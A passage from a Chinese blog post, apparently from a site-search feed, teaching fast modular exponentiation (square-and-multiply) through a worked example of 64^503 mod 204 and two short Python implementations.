<p>我总结一下，主要的切入点就是降低指数。每次框定在m的剩余系里还是大是吧，那干脆连指数也一起，降低了运算的复杂度</p>
<p>于是就有了，将$3^{10}$拆分成$9^{5}$，然后是$81^{2}\times 9^1$，然后是（没错我去用计算器了）$6561^1\times 9^1$，其中还有对于奇数和偶数指数不同的操作</p>
<p>想当然，很简单是吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">“这一开始我的脑瓜还是能跟上你的。”</span><br><span class="line"></span><br><span class="line">罗辑在黑暗中沉默了很长时间，他的脸在火星的微光中浮现了两三次后才说：“大树，不是什么开始，我们的推论已经结束了。”</span><br></pre></td></tr></table></figure>

<p>我们的推论已经结束了，这就是快速幂算法；我认为，当时发明的人也就是这么推导的</p>
<p>到这里就可以写代码了，只不过，这个用严谨的C写起来更舒服点，当然博客后面也有关于代码的一些优化，像压榨级别，位运算什么的</p>
<p>确实奥妙（了个妙）</p>
<h2 id="平方·乘算法"><a href="#平方·乘算法" class="headerlink" title="平方·乘算法"></a>平方·乘算法</h2><p>你以为这样结束了？由于我事先知道怎么实现，再反过来看推导过程，感觉确实变得相当清晰明了了</p>
<p>运用上课所学知识，可以对快速幂进行再度封装，甚至可以在一定程度上满足<strong>手算</strong>的需要（至于这个算法究竟叫什么，别要尝试理解，我也很⊕呢）</p>
<p>上面提到的整除二，以至于到了后面的位运算操作，可以想到直接将指数用二进制表示（由于个人能力有限，无法形成教科书般语言，下面以一个例子方式向大家介绍用法）</p>
<h3 id="从左往右"><a href="#从左往右" class="headerlink" title="从左往右"></a>从左往右</h3><p>假设我们要算$64^{503}\ mod\ 204$<br>那么，<br>$\because (503)_{10}=(111110111)_2$</p>
<p>$\therefore $就是求$64^{(111110111)_2}\ mod\ 204$</p>
<p>$64^{(1)_2}\equiv 64\ mod\ 204=64$<br>$64^{(11)_2}\equiv 64^2\times 64\ mod\ 204=4$<br>$64^{(111)_2}\equiv 4^2\times 64\ mod\ 204=4$<br>$64^{(1111)_2}\equiv 4^2\times 64\ mod\ 204=4$<br>$64^{(11111)_2}\equiv 4^2\times 64\ mod\ 204=4$<br>$64^{(111110)_2}\equiv 4^2\ mod\ 204=16$<br>$64^{(1111101)_2}\equiv 16^2\times 64\ mod\ 204=64$（又回来了？）<br>$64^{(11111011)_2}\equiv 64^2\times 64\ mod\ 204=4$<br>$64^{(111110111)_2}\equiv 4^2\times 64\ mod\ 204=4$</p>
<p>要qq截图不要latexx</p>
<img alt="快速幂算法-187e7ed5.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/快速幂算法-187e7ed5.png" width="" height="">

<p>和结果验证一下</p>
<img alt="快速幂算法-38090b2d.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/快速幂算法-38090b2d.png" width="" height="" >

<p>（我发4这些个数字是我随便乱凑的，没想到中间竟然那么凑巧，不过某种程度上也可见，快速幂的效率之高，希望中途没有哪里搞错）</p>
<p>说明一下，上面这一溜的操作，技巧只有一个：<strong>移动一位平方，为1再乘一次底数</strong></p>
<p>至于如证明其正确性呢，那你可要看好了<br>$$<br>64^{(503)_{10}}=64^{(111110111)_2}=64^{((((((((1\times 2)+1)\times 2+1)\times 2+1)\times 2+1)\times 2)\times 2+1)\times 2+1)\times 2+1}<br>$$</p>
<p>dbq，我凑得数太大了，不想看可以看我手写的（字是丑了点）</p>
<img alt="快速幂算法-66df0465.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/快速幂算法-66df0465.png" width="" height="">

<p>主要想说的是上面这一大串东西不就是不断把503模二取余么，也就是那位大佬的博客里说的，偶数和奇数的处理情况</p>
<p>（听懂掌声）</p>
<p>再来看看一开始的代码，就是比较粗糙的实现，我就不多加解释了，当然结合位运算就更好啦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t_bin = <span class="built_in">bin</span>(e)[<span class="number">2</span>:]</span><br><span class="line"><span class="comment"># 避免没有进入循环直接得出答案的情况</span></span><br><span class="line">ans = m % n</span><br><span class="line"><span class="comment"># 第一个数肯定为1，但是不平方</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> t_bin[<span class="number">1</span>:]:</span><br><span class="line">    ans = ans ** <span class="number">2</span> % n</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        ans = ans * m % n</span><br></pre></td></tr></table></figure>

<h3 id="从右往左"><a href="#从右往左" class="headerlink" title="从右往左"></a>从右往左</h3><p>从左往右，比较简单，虽然不知道为什么，但确实如此</p>
<p>老师说，从右往左也是一样的，但我在实现的时候，觉得还是有些许差别的，首先如果右边最低位是0该如何处理</p>
<p>不会了，在csdn后，我py（哦不，禁止py）到一个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t_bin = <span class="built_in">bin</span>(e)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">ans = <span class="number">1</span></span><br><span class="line">t = m % n</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> t_bin:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        ans = ans * t % n</span><br><span class="line">    t = t ** <span class="number">2</span> % n</span><br></pre></td></tr></table></figure>

<p>实现手法和我如出一辙，所以我和容易看出，为了防止最低位是0的情况，一开始先模一下，也就是相当于从左到右的第一个是1的情况，后面的方法就确实如老师说的惊人的相似了，就是顺序调一下</p>
<p>聪明的你，一定能看懂</p>
]]></content>
      <categories>
        <category>密码学军火库</category>
        <category>基层知识学习</category>
      </categories>
      <tags>
        <tag>快速幂</tag>
      </tags>
  </entry>
</search>
